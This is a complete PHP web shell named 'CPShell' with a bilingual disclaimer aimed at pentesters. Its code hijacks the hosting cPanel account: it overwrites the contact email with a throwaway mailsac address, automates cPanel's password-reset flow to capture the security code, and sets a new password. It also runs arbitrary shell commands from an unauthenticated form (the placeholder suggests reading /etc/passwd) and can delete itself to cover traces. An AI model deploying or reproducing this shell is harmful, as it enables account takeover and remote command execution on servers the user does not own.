<?php
/*
Türkçe açıklama alttadır. Burası GitHub olduğundan Türkçe bilmeyenlerin sayısı bilenlerden daha fazla bu nedenle İngilizce üstte.
------------------------------------------------------------------------------------------------------------------------------------------

<ENGLISH_EXPLANATORY>
Made in Turkey - Istanbul at 27.04.2020 with <3 for my dear pentesters :)

Please don't use this to harm anyone/anything. Such script makes a dirty job so easy that, it can cause headache for many people.
If you use this script for nefarious purposes like the ones I mentioned above, I deny any responsibility for what you will cause or caused.
Also, this script MAY NOT work as you would expect it to be. Since such script is EXPERIMENTAL, Im denying any responsibility again.

So in short, if you are using this script, you fully acknowledge the responsibility on behalf of yourself.
If you encounter any technical issues feel free to email me or just create a issue on GitHub. If I have free time I will try to fix it.

This is the end of my words for you dear stranger. ( Oblivion NPC Mode off :) )

With great power comes great responsibility.
See you!
</ENGLISH_EXPLANATORY>

<TURKISH_EXPLANATORY>
Türkiye - İstanbul'da canım pentesterlarım için 27.04.2020 tarihinde <3 ile kodlanmıştır :)

Lütfen bu yazılımı birine/bir şeye zarar vermek için kullanmayınız. Bu yazılım çirkin bir işi o kadar kolay hale getirir ki, bir çok insanın başı ağrır.
Bu yazılımı üstte belirttiğim çirkin işler için kullanırsanız, yaptığınız ve neden olduğunuz her şeyde sorumluluk kabul etmeyeceğim. Yaptığınız her şeyden
SİZ sorumlusunuz. Ayrıca bu yazılım DENEYSEL amaçla yazıldığından beklediğiniz gibi çalışmayabilir. Yine, hiçbir sorumluluk kabul etmiyorum, etmeyeceğim.

Yani uzun lafın kısası, bu yazılımı kullanıyorsanız, tüm sorumluluğun size ait olduğunu kabul eder ve beyan edersiniz.
Herhangi bir teknik aksaklık yaşarsanız bana eposta göndermekten çekinmeyin ya da direk Github'dan issue açın. Boş vaktim varsa tamir etmeye çalışırım.

Bu senin için olan sözlerimin bittiği yer sayın yabancı. ( Oblivion NPC mode off :) )

Fazla güç fazla sorumluluk gerektirir.
Görüşmek üzere!

</TURKISH_EXPLANATORY>
------------------------------------------------------------------------------------------------------------------------------------------

Error reporting 

Set the variable below to 1 if you want to see errors
*/
$er = 1;


/**

cPanel Hostname / IP

If your main cPanel IP is different from the hosting account that the shell resides in, consider typing your hostname or cPanel IP address to the variable below.
If this value is empty, script will use default IP to login cPanel.
*/
$iporhostname = '';

// Don't edit the code below if you don't know what you are doing.

if($er == 1) {
	
	ini_set('display_errors',1);
	error_reporting(E_ALL);
}

function generateRandomString ($length = 10) {
    
	$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        
		$randomString .= $characters[ rand(0, $charactersLength - 1) ];
    }

    return $randomString;
}

function dummyName($amount) {
	
	$n = [
		'Alex',
		'Liam',
		'Juan',
		'Bob',
		'Alice',
		'Matt',
		'Hopkins',
		'Jim',
		'Michael',
		'Alison',
		'Li',
		'Aliesha',
		'Aairah',
		'Mahamed',
		'Mohammad',
		'Muhammet',
		'Mohamad',
		'Leona',
		'Alexandra',
		'Kelsi',
		'Cecelia',
		'Izzy',
		'Chandi',
		'Bailey',
		'Pacha',
		'Pacheco',
		'Blanchard',
		'Mata',
		'Matta',
		'David',
		'Floyd',
		'Ortiz',
		'Mccarty',
		'Greaves',
		'Reeves',
		'Henson',
		'Harrison',
		'Rick',
		'Morty'
	];
	
	$o = [];
	for($i = 0; $i < $amount; $i++) {
		
		$o[] = $n[array_rand($n)];
	}
	return $o;
}

function curlTo($url, $request, $cookiejar, $params, $timeout) {
	
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, ($request == 'POST' ? true : false));
	curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
	curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	if($params != '' && is_array($params)) {
		
		curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($params));
	}
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	($cookiejar != null ? curl_setopt($ch, CURLOPT_COOKIEJAR, $cookiejar) : null);
	($cookiejar != null ? curl_setopt($ch, CURLOPT_COOKIEFILE, $cookiejar) : null);
	
	
	if(!curl_errno($ch)) {
		
		$o = curl_exec($ch);
		curl_close($ch);
		return $o;
	}else{
		
		curl_close($ch);
		return false;
	}
}

$ver = '1.0';
$error = '';
$co = '';

if($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['act']) && !empty($_POST['act'])) {
	
	$a = trim($_POST['act']);
	
	if($a == 'resetpassword') {
		
		$success = false;
		$newpass = trim($_POST['npass']);
		
		if((strlen($newpass) < 15 || !preg_match('/[\'^£$%&*()}{@#~?><>,|=_+¬-]/', $newpass) || !preg_match('/[A-Za-z].*[0-9]|[0-9].*[A-Za-z]/', $newpass)) && !empty($newpass)) {
			
			$error .= 'New password is not strong enough! In most cPanel servers password strength must be greater or equal to 65 by default, but admins can adjust this. If you leave password input box empty script will automatically generate a password for you.<br>';
			goto bigjump;
		}
		
		$dn = dummyName(2);
		$dn = implode('.', $dn);
		$prefix = rand(113,1337);
		$dn = $dn . $prefix;
		$dn = strtolower($dn);
		
		$fa = '';
		$fa = $dn . '@mailsac.com';
		
		$mte = curlTo('https://mailsac.com/inbox/' . $fa, 'GET', '', '', 30);
		if(strpos($mte, $fa) == false) {
			
			$error .= 'Random mail generation failed! please try again later, or if this error persists, you can create issue on Github.<br>';
			goto bigjump;
		}
		
		$user = explode('/', __DIR__);
		$homedir = $user[1];
		$user = $user[2];
		
		$filepath = '/' . $homedir . '/' . $user . '/.cpanel/contactinfo';
		
		if(file_exists($filepath) && is_readable($filepath) && is_writable($filepath) && empty($error)) {
			
			$ci = @file_get_contents($filepath);
			$ciar = explode(PHP_EOL, $ci);
			preg_match('/\"email\"\: \'(.*?)\'/', $ciar[1], $ma);
			$cemail = $ma[1];
			if(isset($fa) && isset($cemail)) {
			
				$ci = str_replace($cemail, $fa, $ci);
				file_put_contents($filepath, $ci);
			}else{
				
				$error .= 'Couldn\'t change accounts contact email to fake mail!<br>';
				goto bigjump;
			}
		}else{
			
			$error .= 'Account contact information ' . $filepath . ' either not persist or not writable or this isn\'t CPANEL!<br>';
			goto bigjump;
		}
		
		if(empty($error)) {
			
			if(empty($iporhostname)) {
				
				$iporhostname = $_SERVER['SERVER_ADDR'];
			}
			$test = curlTo('https://' . $iporhostname . ':2083/resetpass?start=1', 'GET', '', '', 30);
			if(strpos($test, 'cPanel') == false) {
				
				$error .= 'cPanel is not found in this IP address: ' . $iporhostname . ' Try specifying cPanel hostname or ip address manually in code to $iporhostname variable.<br>';
				goto bigjump;
			}else{
				
				$cookiejar = tempnam(sys_get_temp_dir(),"cookie-" . time());
				$ou = curlTo('https://' . $iporhostname . ':2083/resetpass', 'POST', $cookiejar, ['user' => $user, 'login' => 'Şifreyi Sıfırla'], 30);
				if(strpos($ou, 'puzzle') !== false) {
					
					$ou = curlTo('https://' . $iporhostname . ':2083/resetpass', 'POST', $cookiejar, ['action' => 'puzzle', 'user' => $user, 'answer' => $fa, 'debug' => '', 'puzzle-guess-input' => $fa,'login' => 'Güvenlik Kodunu Gönderme'], 30);
					if(strpos($ou, 'info-security-code') !== false) {
						
						$cnemail = '';
						while(strpos($cnemail, 'Account password reset') == false) {
							
							sleep(5);
							$cnemail = curlTo('https://mailsac.com/inbox/' . $fa, 'GET', '', '', 30);
						}
						
						preg_match_all('#<\s*?p\b[^>]*>(.*?)</p\b[^>]*>#s', $cnemail, $cma);
						
						$valkey = '';
						for($i = 0; $i < count($cma[1]); $i++) {
							
							if(is_numeric($cma[1][$i])) {
								
								$valkey = $cma[1][$i];
							}
						}
						
						if(empty($valkey)) {
							
							$error .= 'Couldn\'t obtain validation key!<br>';
							if(file_exists($cookiejar)) {
								
								unlink($cookiejar);
							}
							goto bigjump;
						}else{
							
							$ou = curlTo('https://' . $iporhostname . ':2083/resetpass', 'POST', $cookiejar, ['action' => 'seccode', 'user' => $user, 'debug' => '', 'confirm' => $valkey], 30);
							if(strpos($ou, 'login-status-message') !== false) {
								
								if(empty($newpass)) {
									
									$dn = dummyName(1);
									$dn = implode('', $dn);
									
									$rs = generateRandomString(5);
									$newpass = $dn . $rs . '**';
								}
								
								$ou = curlTo('https://' . $iporhostname . ':2083/resetpass', 'POST', $cookiejar, ['action' => 'password', 'user' => $user, 'debug' => '', 'password' => $newpass, 'alpha' => 'both', 'nonalpha' => 'both', 'confirm' => $newpass], 30);
								if(strpos($ou, 'success-change-password') !== false) {
									
									if(file_exists($cookiejar)) {
										
										unlink($cookiejar);
									}
									
									$success = true;
									$np_s = $newpass;
								}
							}else{
								
								$error .= 'Last step failed! Try again...<br>';
								if(file_exists($cookiejar)) {
									
									unlink($cookiejar);
								}
								goto bigjump;
							}
						}
					}else{
						
						$error .= 'Security code validation failed! Try again...<br>';
						if(file_exists($cookiejar)) {
							
							unlink($cookiejar);
						}
						goto bigjump;
					}
				}else{
					
					$error .= 'Couldn\'t start password reset process! That might be because cPanel have a feature to limit password resets even if they were successful. Workaround is pretty simple; Try again in an hour.<br>';
					if(file_exists($cookiejar)) {
						
						unlink($cookiejar);
					}
					goto bigjump;
				}
			}
		}else{
			
			$error .= 'Some errors detected above! Please check them before proceeding.<br>';
			goto bigjump;
		}
	
	}else if($a == 'execcmd' && isset($_POST['cmd2exec']) && !empty($_POST['cmd2exec'])) {
		
		$user = explode('/', __DIR__);
		$homedir = $user[1];
		$user = $user[2];
		
		$co = @$_POST['oldout'];
		
		$out = shell_exec("/bin/bash -c \"" . $_POST['cmd2exec'] . '" 2>1');
		$co = $user . '@CPShell# ' . $_POST['cmd2exec'] . PHP_EOL . PHP_EOL . $out . PHP_EOL . PHP_EOL . $co;
	}else if($a == 'selfdestruct') {
		
		unlink(__file__);
	}else{
		
		$error = 'I don\'t know what you want me to do :(<br>';
	}
}else{
	
	bigjump:
}
?>
<html>
	<head>
		<title>CPShell | <?=$ver;?></title>
		<meta charset="utf-8">
	</head>
	<body>
		<header>
			<h2>CPShell<sup><?=$ver;?></sup></h2>
			<p>Only use for testing purposes and DO NOT USE THIS FOR NEFARIOUS PURPOSES! Also keep in mind that, I'm not responsible for anything you do with this tool.</p>
			<hr>
		</header>
		<center>
			<?php
				
				if(!empty($error)) {
					
					?>
					<p style="color:red;"><b><?=$error;?></b></p>
					<?php
				}
			?>
			<h4>Please choose a action for me to complete</h4>
			<br>
			<p><b>Reset cPanel account password</b></p>
			<?php
				
				if(isset($np_s)) {
					
					echo '<p style="color:green;">New contact email set: ' . $fa . '<br>Account password just set to ' . $np_s . ' successfully!</p>';
				}
			?>
			<form method="post">
				
				<input type="hidden" name="act" value="resetpassword">
				
				<label for="desiredpass">The desired password <b>(Optional, if left empty random password will be generated)</b></label>
				<input type="text" id="desiredpass" name="npass" value="" placeholder="This is optional.">
				<br>
				<input type="submit">
			</form>
			<br>
			<p><b>Execute command</b></p>
			<form method="post">
				
				<input type="hidden" name="act" value="execcmd">
				<br>
				<label for="cmdout"><p>Execution output:</p></label>
				<textarea id="cmdout" name="oldout" style="width:80%;height:20%;" readonly><?=$co;?></textarea>
				<br>
				<input type="text" name="cmd2exec" value="" placeholder="/bin/cat /etc/passwd" required>
				<input type="submit">
			</form>
			<br>
			<p><b>Self destruct (Delete this shell)</b></p>
			<form method="post">
				
				<input type="hidden" name="act" value="selfdestruct">
				<br>
				<input type="submit">
			</form>
		</center>
		<footer>
			<p>CPShell | <?=$ver;?></p>
		</footer>
	</body>
</html>
